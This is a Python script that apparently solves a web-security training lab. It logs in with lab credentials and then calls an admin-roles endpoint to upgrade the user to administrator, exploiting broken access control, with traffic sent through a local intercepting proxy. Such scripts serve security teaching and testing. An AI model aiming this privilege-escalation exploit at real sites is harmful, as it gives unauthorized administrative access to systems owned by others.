import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def upgrade_user(s, url):

    #login as user
    login_url = url + "/login"
    login_data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as user!")

        #Exploit access control
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_roles_url, verify=False, proxies=proxies)
        res = r.text
        if "Admin panel" in res:
            print("[+] successfully elevated user to administrator!")
        else:
            print("[-] Could not promote user to administrator.")
            sys.exit(-1)

    else:
        print("[-] Unabled to login as user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("Logging in as user...")
    upgrade_user(s, url)

if __name__ == "__main__":
    main() 